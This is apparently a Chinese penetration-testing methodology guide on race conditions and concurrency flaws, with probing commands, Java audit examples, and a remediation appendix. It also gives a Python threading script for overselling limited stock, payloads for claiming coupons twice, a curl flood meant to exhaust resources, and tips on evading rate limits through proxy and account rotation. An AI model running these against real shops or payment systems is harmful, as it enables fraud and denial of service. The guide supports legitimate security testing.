# 并发异常测试方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的

阐述并发异常测试的方法论，为测试人员提供一套标准化、可复现的并发异常测试流程。帮助安全工程师发现并利用应用程序在高并发场景下异常处理的安全缺陷，包括竞态条件、资源竞争、死锁等问题。

## 1.2 适用范围

本文档适用于以下场景：
- 高并发 Web 应用和 API 服务
- 金融交易、电商秒杀等业务系统
- 存在共享资源访问的多线程应用
- 分布式系统和微服务架构

## 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 安全分析师
- 负责代码审计的开发人员
- 系统架构师

---

# 第二部分：核心渗透技术专题

## 专题一：并发异常测试

### 2.1 技术介绍

并发异常测试针对应用程序在并发环境下的异常处理能力进行安全测试，包括：
- 并发请求下的异常行为分析
- 资源共享和竞争条件
- 锁机制和同步控制
- 线程池和连接池管理
- 分布式锁和一致性

**漏洞本质：** 并发控制机制不完善，在多个请求同时访问时异常处理未能保证数据一致性和系统稳定性。

| 并发问题类型 | 描述 | 安全风险 |
|-------------|------|---------|
| 竞态条件 | 执行顺序影响结果 | 数据不一致、超卖 |
| 资源竞争 | 多个请求争夺资源 | 资源耗尽、服务中断 |
| 死锁 | 循环等待资源 | 服务不可用 |
| 活锁 | 不断重试但无法前进 | 资源浪费 |
| 线程泄漏 | 线程未正确释放 | 资源耗尽 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 电商秒杀 | 限量商品抢购 | 超卖、库存不一致 |
| 金融交易 | 并发转账、支付 | 重复扣款、资金丢失 |
| 票务系统 | 机票、电影票预订 | 重复出票、座位冲突 |
| 优惠券 | 优惠券领取和使用 | 超额领取、重复使用 |
| 计数器 | 点赞数、浏览量 | 计数不准确 |
| 缓存系统 | 缓存更新 | 缓存不一致、缓存穿透 |
| 消息队列 | 异步任务处理 | 消息重复消费、丢失 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**并发异常探测技术：**

| 探测方法 | 操作说明 | 预期观察 |
|---------|---------|---------|
| 并发请求 | 同时发送多个相同请求 | 观察响应一致性 |
| 压力测试 | 持续高并发请求 | 观察系统稳定性 |
| 资源竞争 | 并发访问同一资源 | 观察数据一致性 |
| 边界测试 | 在临界值并发操作 | 观察异常行为 |
| 疲劳测试 | 长时间并发请求 | 观察资源泄漏 |

**探测工具：**
```bash
# 1. 使用 ab 进行并发测试
ab -n 10000 -c 100 https://target.com/api/seckill

# 2. 使用 wrk 进行压力测试
wrk -t12 -c400 -d30s https://target.com/api/action

# 3. 使用 curl 并发
for i in {1..100}; do
  curl -X POST https://target.com/api/action &
done
wait

# 4. 使用 JMeter
# 配置线程组，设置并发用户数
```

**探测步骤：**
1. 识别并发敏感操作
2. 设计并发测试场景
3. 配置测试工具参数
4. 执行并发测试
5. 分析响应和最终状态
6. 检查数据一致性

#### 2.3.2 白盒测试

**代码审计检查点：**

```java
// 高危代码示例 1：非线程安全的计数器
public class Counter {
    private int count = 0;
    
    public void increment() {
        count++;  // 非原子操作，竞态条件
    }
    
    public int getCount() {
        return count;
    }
}

// 高危代码示例 2：检查后使用（TOCTOU）
public void withdraw(String accountId, int amount) {
    int balance = getBalance(accountId);
    if (balance >= amount) {  // Check
        // Time gap - 其他线程可能修改余额
        setBalance(accountId, balance - amount);  // Use
    }
}

// 高危代码示例 3：未同步的集合操作
public class UserService {
    private List<User> users = new ArrayList<>();
    
    public void addUser(User user) {
        users.add(user);  // 多线程下可能 ConcurrentModificationException
    }
}

// 高危代码示例 4：死锁风险
public void transfer(Account from, Account to) {
    synchronized (from) {
        synchronized (to) {  // 如果另一线程反向锁定，可能死锁
            // 转账逻辑
        }
    }
}

// 高危代码示例 5：线程池未正确处理异常
ExecutorService executor = Executors.newFixedThreadPool(10);
executor.submit(() -> {
    // 异常被吞没，无日志
    riskyOperation();
});

// 高危代码示例 6：连接池泄漏
public void query() {
    Connection conn = dataSource.getConnection();
    // 如果抛出异常，conn 未关闭
    Statement stmt = conn.createStatement();
    stmt.executeQuery(sql);
    // 未关闭连接
}
```

**审计关键词：**
- `synchronized` - 同步块
- `Lock` / `unlock` - 显式锁
- `volatile` - 可见性保证
- `AtomicXXX` - 原子类
- `ConcurrentHashMap` - 并发集合
- `ExecutorService` - 线程池
- `ThreadPoolExecutor` - 线程池

### 2.4 漏洞利用方法

#### 2.4.1 超卖攻击

**利用场景：** 电商秒杀

```python
# 攻击脚本
import requests
import threading

def buy_product():
    response = requests.post('https://target.com/api/buy', json={
        'product_id': 'LIMITED_001',
        'quantity': 1
    })
    if response.status_code == 200:
        print("Purchase successful")

# 并发 100 个线程
threads = []
for _ in range(100):
    t = threading.Thread(target=buy_product)
    threads.append(t)
    t.start()

for t in threads:
    t.join()

# 预期：只有 1 个成功（库存=1）
# 实际：可能有多个成功（超卖）
```

#### 2.4.2 重复领取优惠券

**利用场景：** 优惠券系统

```http
攻击步骤：
1. 准备多个并发请求
2. 同时领取同一张优惠券
3. 如果检查逻辑有竞态条件：
   - 多个请求都通过"是否已领取"检查
   - 优惠券被重复领取

Payload:
POST /api/coupon/receive
{"coupon_id": "SAVE100"}
# 并发发送 10 次
```

#### 2.4.3 计数器攻击

**利用场景：** 点赞、余额计数

```
攻击步骤：
1. 分析计数器的实现
2. 并发发起增减操作
3. 如果未使用原子操作：
   - 最终计数与实际不符
   - 可能利用差异获利

示例：
初始余额：100
并发操作：+50, -30, +20
预期结果：140
实际可能：120 或 150（取决于执行顺序）
```

#### 2.4.4 资源耗尽攻击

**利用场景：** 连接池、线程池

```
攻击步骤：
1. 分析资源池大小和超时配置
2. 发送大量请求占用所有资源
3. 在资源释放前持续占用
4. 正常用户无法获取资源

Payload:
# 并发 1000 个请求，每个请求持有资源 10 秒
for i in {1..1000}; do
  curl -X POST https://target.com/api/slow &
done
```

#### 2.4.5 死锁攻击

**利用场景：** 资源锁定

```
攻击步骤：
1. 分析系统的锁获取顺序
2. 构造请求序列使不同请求以相反顺序获取锁
3. 触发死锁

示例：
请求 A: 获取锁 1 → 获取锁 2
请求 B: 获取锁 2 → 获取锁 1
结果：死锁，两个请求都阻塞
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过速率限制

**场景：** 系统有并发请求限制

**绕过方法：**
```
1. 分布式攻击：使用多个 IP/代理
2. 慢速并发：降低频率，延长攻击时间
3. 账户轮换：使用多个账户
```

#### 2.5.2 绕过锁机制

**场景：** 系统有基本的锁保护

**绕过方法：**
```
1. 锁粒度分析：找到锁保护的盲区
2. 锁超时利用：等待锁超时后进入
3. 读写锁利用：利用读锁不互斥的特性
```

---

# 第三部分：附录

## 3.1 并发异常检测清单

| 检查项 | 检测方法 | 风险等级 |
|-------|---------|---------|
| 非原子操作 | 代码审计 + 并发测试 | 高 |
| TOCTOU 模式 | 代码审计 | 高 |
| 未同步集合 | 代码审计 | 中 |
| 死锁风险 | 代码审计 | 中 |
| 资源泄漏 | 疲劳测试 | 高 |
| 线程池异常 | 代码审计 | 中 |

## 3.2 安全并发编程建议

```java
// 推荐做法

// 1. 使用原子类
public class Counter {
    private AtomicInteger count = new AtomicInteger(0);
    
    public void increment() {
        count.incrementAndGet();
    }
}

// 2. 使用并发集合
private ConcurrentHashMap<String, User> users = new ConcurrentHashMap<>();

// 3. 使用锁
private final Lock lock = new ReentrantLock();
public void safeOperation() {
    lock.lock();
    try {
        // 临界区
    } finally {
        lock.unlock();
    }
}

// 4. 避免死锁：固定锁顺序
public void transfer(Account from, Account to) {
    Account first = from.getId() < to.getId() ? from : to;
    Account second = from.getId() < to.getId() ? to : from;
    synchronized (first) {
        synchronized (second) {
            // 转账逻辑
        }
    }
}

// 5. 正确处理线程池异常
ExecutorService executor = Executors.newFixedThreadPool(10);
executor.submit(() -> {
    try {
        riskyOperation();
    } catch (Exception e) {
        logger.error("Task failed", e);
    }
});

// 6. 使用 try-with-resources
public void query() {
    try (Connection conn = dataSource.getConnection();
         PreparedStatement stmt = conn.prepareStatement(sql)) {
        // 自动关闭资源
    } catch (SQLException e) {
        logger.error("Query failed", e);
    }
}
```

## 3.3 并发测试工具

| 工具 | 用途 | 命令示例 |
|-----|------|---------|
| Apache Benchmark | HTTP 并发测试 | `ab -n 1000 -c 100 url` |
| wrk | HTTP 压力测试 | `wrk -t12 -c400 url` |
| JMeter | 并发场景测试 | GUI 配置 |
| Gatling | 性能测试 | Scala DSL |
| custom script | 精确控制 | Python threading |
